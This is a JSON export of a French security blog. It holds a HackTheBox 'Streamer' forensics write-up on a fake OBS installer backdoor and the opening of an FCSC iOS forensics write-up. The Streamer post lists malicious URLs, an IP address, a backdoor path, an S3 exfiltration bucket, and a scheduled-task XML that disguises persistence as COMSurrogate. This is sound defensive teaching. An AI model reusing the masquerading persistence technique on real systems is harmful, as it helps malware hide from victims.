




[{"content":"","date":"8 juillet 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/graphite/","section":"Tags","summary":"","title":"Graphite","type":"tags"},{"content":"","date":"8 juillet 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/paragon/","section":"Tags","summary":"","title":"Paragon","type":"tags"},{"content":"","date":"8 juillet 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/patch-diffing/","section":"Tags","summary":"","title":"Patch-Diffing","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/","section":"Jaybird1291","summary":"","title":"Jaybird1291","type":"page"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/sherlock/","section":"Tags","summary":"","title":"Sherlock","type":"tags"},{"content":"\rSc√©nario #\rSimon Stark est un d√©veloppeur chez forela qui a r√©cemment pr√©vu de diffuser des sessions de programmation avec ses coll√®gues, ce qui lui a valu l\u0026rsquo;appr√©ciation du PDG et d\u0026rsquo;autres coll√®gues. Il a install√© sans le savoir un logiciel de streaming bien connu qu\u0026rsquo;il a trouv√© par le biais d\u0026rsquo;une recherche sur Google et qui √©tait l\u0026rsquo;une des principales URL promues par les publicit√©s de Google. Malheureusement, les choses ont mal tourn√© et un incident de s√©curit√© s\u0026rsquo;est produit. Analysez les artefacts tri√©s fournis pour d√©couvrir ce qui s\u0026rsquo;est pass√© exactement.\nAttack Flow Diagram - Sch√©ma global #\rPour un rapide overview du challenge voici l\u0026rsquo;attack flow diagram que j\u0026rsquo;ai r√©alis√©, si vous ne voulez pas vous spoil vous pouvez le sauter :\nSetup #\rPour ce Sherlock nous allons utiliser :\nEric Zimmerman\u0026rsquo;s Tools (Registry Explorer, EvtxECmd, MFTECmd TimeLine Explorer, PECmd\u0026hellip;) HxD Hex Editor strings Pour nous aider on va aussi s\u0026rsquo;appuyer sur des Cheatsheets tels que :\nhttps://cdn.13cubed.com/downloads/windows_event_log_cheat_sheet.pdf https://cdn.13cubed.com/downloads/windows_registry_cheat_sheet.pdf https://cdn.13cubed.com/downloads/anatomy_of_an_ntfs_file_record.pdf Question 1 #\rQuel est le nom original du fichier zip malveillant que l\u0026rsquo;utilisateur a t√©l√©charg√© en pensant qu\u0026rsquo;il s\u0026rsquo;agissait d\u0026rsquo;une copie l√©gitime du logiciel ?\nPour r√©pondre √† cette question nous allons chercher dans la hive utilisateur NTUSER.DAT. En effet, c\u0026rsquo;est ici que sont enregistr√©es, dans la cl√© RecentDocs, les fichiers r√©cemment ouverts par l‚Äôutilisateur.\nR√©ponse : OBS-Studio-28.1.2-Full-Installer-x64.zip\nQuestion 2 #\rSimon Stark a renomm√© le fichier zip t√©l√©charg√© en un autre nom. Quel est le nom renomm√© du fichier ainsi que le chemin d\u0026rsquo;acc√®s complet ?\nPour r√©pondre √† cette question, il faut d‚Äôabord comprendre que toute op√©ration de renommage sous NTFS (le filesystem de Windows) g√©n√®re une modification du $FILE_NAME (attribut 0x30) dans la MFT.\nOn utilise donc MFTECmd pour parser la $MFT :\nMFTECmd.exe -f \u0026#34;C:\\$MFT\u0026#34; --csv \u0026#34;C:\\Temp\\Out\u0026#34; Puis on l\u0026rsquo;importe dans Timeline Explorer :\nR√©ponse : C:\\Users\\Simon.stark\\Documents\\Streaming Software\\Obs Streaming Software.zip\nQuestion 3 #\rQuelle est l\u0026rsquo;heure √† laquelle le fichier a √©t√© renomm√© ?\nToujours au m√™me endroit :\nR√©ponse : 2023-05-05 10:22:23\nQuestion 4 #\rQuelle est l\u0026rsquo;URL compl√®te √† partir de laquelle le logiciel a √©t√© t√©l√©charg√© ?\nToujours au m√™me endroit :\nLe fait de t√©l√©charger un fichier sous Windows (via un navigateur comme Edge ou Internet Explorer) cr√©e automatiquement, sur le NTFS, un flux de donn√©es auxiliaire nomm√© Zone.Identifier.\nCe flux ADS (‚ÄúAlternate Data Stream‚Äù) est stock√© avec le fichier lui-m√™me et contient notamment :\nZoneId : la zone de s√©curit√© (3 = internet) ReferrerUrl : l‚ÄôURL de la page qui a lanc√© le t√©l√©chargement HostUrl : l‚ÄôURL exacte du fichier t√©l√©charg√© R√©ponse : http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip\nQuestion 5 #\rApprofondissez vos recherches et trouvez l\u0026rsquo;adresse IP sur laquelle le domaine malveillant √©tait h√©berg√©.\nIci tr√®s simple, on parse avec EvtxECmd les event logs et on cherche le nom de domaine :\nEvtxECmd.exe -d \u0026#39;C:\\Windows\\System32\\winevt\\Logs\\\u0026#39; --csv \u0026#39;C:\\Temp\\out\u0026#39; R√©ponse : 13.232.96.186\nQuestion 6 #\rPlusieurs ports sources sont connect√©s pour communiquer et t√©l√©charger le fichier malveillant √† partir du site web malveillant. R√©pondez au num√©ro de port source le plus √©lev√© √† partir duquel la machine s\u0026rsquo;est connect√©e au site web malveillant.\nSur Windows si le pare-feu est configur√© pour logg√© les connexions, il va enregistrer chaque tentative d‚Äôacc√®s, non pas sous forme de nom de domaine, mais sous la forme de l‚ÄôIP cible.\nLe fichier pfirewall.log (C:\\Windows\\System32\\LogFiles\\Firewall) enregistre, pour chaque paquet examin√© :\nla date et l‚Äôheure, l‚Äôaction (par exemple ‚ÄúALLOW‚Äù ou ‚ÄúDROP‚Äù), le protocole (TCP/UDP), l‚Äôadresse IP source, l‚Äôadresse IP de destination, les ports source et destination etc. Ici seulement 6 connexions √† cette IP donc pas la peine de s\u0026rsquo;emb√™ter, on peut le trouver manuellement en 5 secondes :\nR√©ponse : 50045\nQuestion 7 #\rLe fichier zip contenait un fichier d\u0026rsquo;installation malveillant qui installait un logiciel malveillant et une instance l√©gitime du logiciel OBS studio, de sorte que l\u0026rsquo;utilisateur n\u0026rsquo;avait aucune id√©e qu\u0026rsquo;il avait √©t√© compromis. Trouvez le hachage du fichier d\u0026rsquo;installation.\nPour r√©pondre √† cette question on va chercher du c√¥t√© de la hive Amcache. Elle recense tous les ex√©cutables lorsqu‚Äôils sont lanc√©s, install√©s, copi√©s, etc. Elle stocke pour chaque application plusieurs metadata : chemin complet, date d‚Äôapparition, et notamment le hash SHA1 du binaire.\nConcr√®tement, au moment o√π l‚Äôutilisateur a extrait le zip et que le setup malveillant a √©t√© ex√©cut√© (ou m√™me simplement ouvert en soit), Windows a ajout√© une entr√©e dans la cl√© :\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\InventoryApplicationFile (correspondant √† Amcache\\InventoryApplicationFile dans le hive Amcache.hve)\nSi nous avions eu une copie du disque compl√®te, on aurait pu calculer le hash √† la vol√©e pour aller plus rapidement. N√©anmoins, c\u0026rsquo;est une mauvaise id√©e.\nContrairement au simple hash calcul√© √† la vol√©e, Amcache enregistre le SHA1 d√®s la premi√®re ex√©cution ou extraction dans le syst√®me local, ind√©pendamment de toute modification ult√©rieure (√† moins que l‚Äôentr√©e Amcache soit explicitement √©dit√© / supprim√©).\nM√™me si l‚Äôutilisateur a effac√© le zip ou renomm√© le setup, Amcache conserve cette ancienne trace tant que le fichier n‚Äôest pas r√©install√© ou que l‚Äôentr√©e n‚Äôest pas nettoy√©e.\nR√©ponse : 35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1\nQuestion 8 #\rLe logiciel malveillant a install√© automatiquement une porte d√©rob√©e sur le poste de travail de la victime. Quels sont le nom et le chemin d\u0026rsquo;acc√®s au fichier de la porte d√©rob√©e ?\nRetournons √† la $MFT car elle enregistre chaque cr√©ation et ex√©cution de fichier.\nPour proc√©der j\u0026rsquo;ai simplement chercher un lien temporel avec l\u0026rsquo;ex√©cution du setup malveillant :\nje savais qu‚Äô√† l‚Äôinstant T0 (2023-05-05 10:23:14), l‚Äôutilisateur a lanc√© le setup malveillant quelques secondes plus tard (T0 + quelques secondes) appara√Æt dans la chronologie une nouvelle entr√©e : C:\\Program Files\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe comme il n‚Äôexistait pas avant (aucune entr√©e ant√©rieure dans le $MFT pour ce chemin), on en d√©duit que c‚Äôest ce fichier qu‚Äôa cr√©√© le setup malveillant. R√©ponse : C:\\Users\\Simon.stark\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe\nQuestion 9 #\rTrouver le \u0026ldquo;prefetch hash\u0026rdquo; de la backdoor.\nLorsque qu\u0026rsquo;on ex√©cute un programme sous Windows, le syst√®me enregistre un fichier .pf (prefetch) dans C:\\Windows\\Prefetch dont le nom combine :\nLe nom de l‚Äôex√©cutable (LAT TAKEWODE‚Ä¶.exe) Un hash calcul√© √† partir de son chemin complet sur le disque Ce hash n‚Äôest pas al√©atoire, Windows le g√©n√®re pour distinguer plusieurs instances du m√™me ex√©cutable si elles r√©sident √† des chemins diff√©rents.\n.\\PECmd.exe -d \u0026#39;C:\\Windows\\prefetch\u0026#39; --csv \u0026#39;C:\\Temp\\Out\u0026#39; R√©ponse : D8A6D943\nQuestion 10 #\rLa backdoor est √©galement utilis√©e comme m√©canisme de persistance de mani√®re furtive pour se fondre dans l\u0026rsquo;environnement. Quel est le nom utilis√© pour le m√©canisme de persistance afin qu\u0026rsquo;il ait l\u0026rsquo;air l√©gal ?\nLes m√©canismes de persistance les plus couramment mis en oeuvre sont :\nCl√©s de registre Run / RunOnce Service Windows T√¢ches planifi√©es Dossier de d√©marrage (dossier Startup) etc. Ici, il repose sur la cr√©ation d‚Äôune t√¢che planifi√©e dont le nom imite un processus syst√®me COMSurrogate. Quand Windows cr√©e ou modifie une t√¢che planifi√©e, un √©v√©nement ID 4698 (‚ÄúA scheduled task was created‚Äù) est enregistr√© dans le journal de s√©curit√© (Security.evtx).\n.\\EvtxECmd.exe -d \u0026#39;C:\\Windows\\System32\\winevt\\Logs\\\u0026#39; --csv \u0026#39;C:\\Temp\\Out\\\u0026#39; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02/mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo\u0026gt; \u0026lt;Date\u0026gt;2023-05-05T15:23:21\u0026lt;/Date\u0026gt; \u0026lt;Author\u0026gt;FORELA\\simon.stark\u0026lt;/Author\u0026gt; \u0026lt;URI\u0026gt;\\COMSurrogate\u0026lt;/URI\u0026gt; \u0026lt;/RegistrationInfo\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;StartBoundary\u0026gt;2023-05-05T15:23:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;FORELA\\simon.stark\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;IgnoreNew\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;true\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;true\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;true\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;false\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;true\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT72H\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;7\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Users\\Simon.stark\\Miloyeki\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; R√©ponse : COMSurrogate\nQuestion 11 #\rQuel est le domaine erron√©/invalide nomm√© de mani√®re al√©atoire que le logiciel malveillant a tent√© d\u0026rsquo;atteindre ?\nPuisque la t√¢che planifi√©e a √©t√© cr√©√©e √† 10:23:21, on se place autour de cet horaire dans le channel Microsoft-Windows-DNS-Client/Operational pour rep√©rer le domaine \u0026ldquo;invalide\u0026rdquo; que le malware a tent√© de r√©soudre.\nR√©ponse : oaueeewy3pdy31g3kpqorpc4e.qopgwwytep\nQuestion 12 #\rLe logiciel malveillant a essay√© d\u0026rsquo;exfiltrer les donn√©es vers un seau s3. Quelle est l\u0026rsquo;url du seau s3 ?\nIdem mais on filtre avec \u0026ldquo;s3\u0026rdquo; :\nR√©ponse : bbuseruploads.s3.amazonaws.com\nQuestion 13 #\rSur quel sujet Simon allait-il faire un stream en semaine 1 ? Trouvez une note ou quelque chose de similaire et r√©cup√©rez son contenu pour r√©pondre √† la question.\nOn retrouve dans les fichiers r√©cents de l\u0026rsquo;utilisateur un shortcut vers le fichier \u0026ldquo;Week 1 plan.txt\u0026rdquo;. Mais aucune trace du fichier car on n\u0026rsquo;a pas la copie du dossier en question.\nOn va donc analyser la $MFT. Comme on l\u0026rsquo;a d√©j√† vu, chaque fichier m√™me s\u0026rsquo;il a √©t√© effac√© ou d√©plac√© poss√®de une entr√©e dans la MFT et on va pouvoir retrouver la \u0026ldquo;resident data\u0026rdquo; :\nNon-resident : pour les fichiers de taille suffisante, NTFS ne stocke pas directement leurs donn√©es dans la MFT. Le champ $DATA contient alors des ‚Äúruns‚Äù (des blocs) qui pointent vers des clusters sur le disque o√π le contenu r√©el est stock√©. Resident : quand que le fichier est tr√®s petit (historiquement : moins de 1 KB ou de l‚Äôordre de quelques centaines d‚Äôoctets, selon la version de Windows et la taille de l‚Äôattribut), ses donn√©es sont stock√©es directement √† l‚Äôint√©rieur m√™me de l‚Äôentr√©e MFT, dans le bloc $DATA. On parle alors de resident data. ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ MFT Header ‚îÇ Attribut #0 (STANDARD_INFO) ‚îÇ ... ‚îÇ ‚îÇ (48 bytes‚Ä¶) ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ ‚îÇ ‚îÇ ‚îÇ Attribut #1 (FILE_NAME)‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ ‚îÇ ‚îÇ ‚îÇ Attribut #2 (DATA, resident) ‚îÇ \u0026lt;‚Äî c‚Äôest l√† qu‚Äôest ‚îÇ ‚îÇ ‚îÇ ‚îÇ stock√© le texte. ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ\t...... ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò cf. https://youtu.be/B4b6Ocf3wYs?si=rUruujZiEIdjgFKD\nR√©ponse : Filesystem Security\nQuestion 14 #\rQuel est le nom de l\u0026rsquo;analyste de s√©curit√© qui a tri√© le poste de travail infect√© ?\nUn peu de guess car la question n\u0026rsquo;est pas tr√®s int√©ressante, si vous avez fait pas mal de Sherlock vous commencez √† avoir l\u0026rsquo;habitude c\u0026rsquo;est CyberJunkie.\nR√©ponse : CyberJunkie\nQuestion 15 #\rQuel est le chemin d\u0026rsquo;acc√®s au r√©seau √† partir duquel les outils d\u0026rsquo;acquisition ont √©t√© ex√©cut√©s ?\nPremi√®rement nous devons trouver le tool utilis√©. Pour cela, plusieurs m√©thodes :\nv√©rifier les fichiers LNK \u0026amp; Jump Lists Event ID 4688 (A new process has been created) AmCache (InventoryApplicationFile) $MFT comme on l\u0026rsquo;a vu plus t√¥t Les fichiers Prefetch Pour le plus de rapidit√© j\u0026rsquo;ai d√©cid√© de passer via les fichiers prefetch. Logiquement le tool d\u0026rsquo;acquisition a √©t√© lanc√© le plus r√©cemment possible :\nN√©anmoins pas de chemin.\nDu coup, je v√©rifie dans :\nAppCompatCache : RAS Event ID 4688 : RAS $MFT : RAS Je vais donc chercher du c√¥t√© du NTUSER.DAT mais RAS aussi\u0026hellip; N√©anmoins on voit bien qu\u0026rsquo;on a ntuser.dat.LOG1 et LOG2.\nCe sont des journaux de transactions associ√© √† la ruche de registre utilisateur (NTUSER.DAT).\nChaque modification apport√©e aux cl√©s et valeurs du registre (par exemple, lorsqu‚Äôun chemin r√©seau est ajout√© dans un MRU ou un cl√© UserAssist) est d‚Äôabord √©crite dans ce journal avant d‚Äô√™tre int√©gr√©e (‚Äúcommitt√©e\u0026quot;) dans NTUSER.DAT lui-m√™me. Concr√®tement :\nc‚Äôest le log transactionnel de la ruche utilisateur : √† chaque fois qu‚Äôune application ou Windows √©crit quelque chose dans HKCU (RunMRU, UserAssist, RecentDocs, etc.), la modification est d‚Äôabord consign√©es dans NTUSER.DAT.LOG1 (et LOG2), puis fusionn√©e dans NTUSER.DAT √† un checkpoint si on ferme brutalement la session ou qu‚Äôaucun ‚Äúcheckpoint‚Äù n‚Äôa encore eu lieu, NTUSER.DAT.LOG1 peut contenir des entr√©es qui n‚Äôapparaissent pas encore dans NTUSER.DAT Je lance donc une recherche via string et bingo :\nR√©ponse : \\\\DESKTOP-887GK2L\\Users\\CyberJunkie\\Desktop\\Forela-Triage-Workstation\\Acquisiton and Triage tools\nIOC Table #\rCat√©gorie Type / Champ Valeur (indicateur) Notes Hash Fichiers (origine) Nom ZIP original OBS-Studio-28.1.2-Full-Installer-x64.zip NTUSER.DAT ‚ñ∏ RecentDocs RAS (pas le fichier) Setup malveillant OBS Studio 28.1.2 Full Installer x64.exe Amcache ‚ñ∏ InventoryApplicationFile SHA-1 = 35e3582a9ed14f8a4bb81fd6aca3f0009c78a3a1 Backdoor EXE C:\\Users\\Simon.stark\\Miloyeki ker konoyogi\\lat takewode libigax weloj jihi quimodo datex dob cijoyi mawiropo.exe $MFT RAS (pas le fichier) R√©seau Domain obsproicet.net ADS Zone.Identifier URL exacte http://obsproicet.net/download/v28_23/OBS-Studio-28.1.2-Full-Installer-x64.zip ADS Zone.Identifier IP serveur 13.232.96.186 pfirewall.log Port source max 50045 (TCP) pfirewall.log Domain invalide oaueeewy3pdy31g3kpqorpc4e.qopgwwytep DNS-Client Operational Bucket S3 exfil bbuseruploads.s3.amazonaws.com DNS-Client Operational Persistance Scheduled Task Name \\COMSurrogate Security.evtx (4698) Prefetch hash D8A6D943 Nom du .pf Lab termin√© !\nhttps://labs.hackthebox.com/achievement/sherlock/1271052/899\n","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/posts/streamer/","section":"Posts","summary":"Sc√©nario #\rSimon Stark est un d√©veloppeur chez forela qui a r√©cemment pr√©vu de diffuser des sessions de programmation avec ses coll√®gues, ce qui lui a valu l\u0026rsquo;appr√©ciation du PDG et d\u0026rsquo;autres coll√®gues.","title":"Streamer","type":"posts"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"1 juin 2025","externalUrl":null,"permalink":"/blog-cyber/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":"","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/tags/2025/","section":"Tags","summary":"","title":"2025","type":"tags"},{"content":"","date":"18 mai 2025","externalUrl":null,"permalink":"/blog-cyber/tags/fcsc/","section":"Tags","summary":"","title":"FCSC","type":"tags"},{"content":"\rSc√©nario #\rLors d\u0026rsquo;un passage de douane, le douanier vous demande de lui remettre votre t√©l√©phone ainsi que son code de d√©verrouillage. Le t√©l√©phone vous est rendu quelques heures plus tard ‚Ä¶ Suspicieux, vous envoyez votre t√©l√©phone pour analyse au CERT-FR de l\u0026rsquo;ANSSI. Les analystes du CERT-FR effectuent une collecte sur le t√©l√©phone, compos√©e d\u0026rsquo;un sysdiagnose et d\u0026rsquo;un backup. Ces √©preuves font partie d\u0026rsquo;une s√©rie. Les √©preuves sont ind√©pendantes sauf iBackdoor 2/2 qui d√©pend de iBackdoor 1/2 : iForensics - iCrash iForensics - iDevice iForensics - iWiFi iForensics - iTreasure iForensics - iNvisible iForensics - iBackdoor 1/2 iForensics - iBackdoor 2/2 iForensics - iC2 iForensics - iCompromise\nOn a donc une backup.tar.xz (logique) et des sysdiagnose \u0026amp; crashes !\nSetup #\rPour ces challenges nous allons utiliser :\nDB Browser for SQLite EC-DIGIT-CSIRC/sysdiagnose iLEAPP Autopsy On peut aussi s\u0026rsquo;aider de cheatsheets telles que :\nOn pourrait aussi utiliser des tools et m√©thodologies plus \u0026ldquo;pro\u0026rdquo; (via Plaso etc.) mais dans le contexte du CTF (fait en retard) je n\u0026rsquo;ai pas pris le temps de le faire. ü§†\nIntro - iForensics - iCrash #\rIl semblerait qu\u0026rsquo;un flag se soit cach√© √† l\u0026rsquo;endroit o√π sont stock√©s les crashes sur le t√©l√©phone ‚Ä¶\nIci tr√®s simple. On sait que les crashs se trouvent dans l\u0026rsquo;archive sysdiagnose_and_crashes.tar.xz. On l\u0026rsquo;extrait donc :\ntar -xf sysdiagnose_and_crashes.tar.xz Ici on peut trouver de plusieurs mani√®res, un simple grep grep -r \u0026quot;FCSC{\u0026quot;, se balader dans les logs de crash etc.\nSi on se rend dans sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/ on trouve le fichier fcsc_intro.txt avec le flag.\nFlag : FCSC{7a1ca2d4f17d4e1aa8936f2e906f0be8}\n‚≠ê - iForensics - iDevice #\rPour commencer, trouvez quelques informations d\u0026rsquo;int√©r√™t sur le t√©l√©phone : version d\u0026rsquo;iOS et identifiant du mod√®le de t√©l√©phone. Le flag est au format FCSC{\u0026lt;identifiant du mod√®le\u0026gt;|\u0026lt;num√©ro de build\u0026gt;}. Par exemple, pour un iPhone 14 Pro Max en iOS 18.4 (22E240) : FCSC{iPhone15,3|22E240}.\nPour r√©pondre √† cette question il faut savoir de quoi est constitu√© une backup iOS. J\u0026rsquo;ai parl√© plus haut de backup \u0026ldquo;logique\u0026rdquo;. Cela a une importance car si on regarde √† l\u0026rsquo;int√©rieur de la backup on ne voit que des dossiers bizarres :\nEn fait il faut reconstruire la structure et noms de dossiers / fichiers. Pour cela il faut utiliser la Manifest.db (iOS 10+) en faisant la correspondance entre les RelativePath et les FileID.\nN√©anmoins on voit aussi des fichiers avec des noms normaux dont Info.plist. C\u0026rsquo;est ici qu\u0026rsquo;Apple conserve les metadata cl√©s concernant l\u0026rsquo;appareil :\nProduct Type (identifiant du mod√®le, ex. iPhone12,3), Product Version (version d\u0026rsquo;iOS, ex. 16.0), Build Version (num√©ro de build, ex. 20A362), Divers identifiants (IMEI, MEID, Serial Number, GUID‚Ä¶), Date du dernier backup, applications install√©es, etc. On a donc tout ce qu\u0026rsquo;il nous faut pour faire le flag :\nFlag : FCSC{iPhone12,3|20A362}\nSi reconstruire l\u0026rsquo;arbo vous int√©resse voici pour la d√©monstration :\nPremi√®rement regardons de quoi est constitu√© Manifest.db :\nTr√®s direct, on peut donc scripter facilement la reconstruction comme cela :\n#!/bin/bash BACKUP=\u0026#34;/mnt/hgfs/backup/backup\u0026#34; OUT=\u0026#34;/mnt/hgfs/backup/reconstructed-backup\u0026#34; mkdir -p \u0026#34;$OUT\u0026#34; # on utilise -separator \u0026#39;|\u0026#39; pour que SQLite nous renvoie directement fileID|domain|relativePath sqlite3 -separator \u0026#39;|\u0026#39; \u0026#34;$BACKUP/Manifest.db\u0026#34; \\ \u0026#34;SELECT fileID, domain, COALESCE(relativePath,\u0026#39;\u0026#39;) FROM Files;\u0026#34; \\ | while IFS=\u0026#34;|\u0026#34; read -r FILEID DOMAIN RELPATH; do # Si relativePath est vide, on saute (ce sont souvent des entr√©es de dossier sans chemin) [[ -z \u0026#34;$RELPATH\u0026#34; ]] \u0026amp;\u0026amp; continue # Chemins de sortie pour recr√©er l\u0026#39;arborescence DEST_DIR=\u0026#34;$OUT/$DOMAIN/$(dirname \u0026#34;$RELPATH\u0026#34;)\u0026#34; DEST_PATH=\u0026#34;$OUT/$DOMAIN/$RELPATH\u0026#34; mkdir -p \u0026#34;$DEST_DIR\u0026#34; ln -s \u0026#34;$BACKUP/$FILEID\u0026#34; \u0026#34;$DEST_PATH\u0026#34; 2\u0026gt;/dev/null || true done Et voil√† :\n‚≠ê - iForensics - iWiFi #\rPour continuer, trouvez quelques informations d\u0026rsquo;int√©r√™t sur le t√©l√©phone : SSID et BSSID du r√©seau WiFi sur lequel le t√©l√©phone est connect√© ainsi que le compte iCloud associ√© au t√©l√©phone. Le flag est au format FCSC{||}. Par exemple, si le t√©l√©phone est 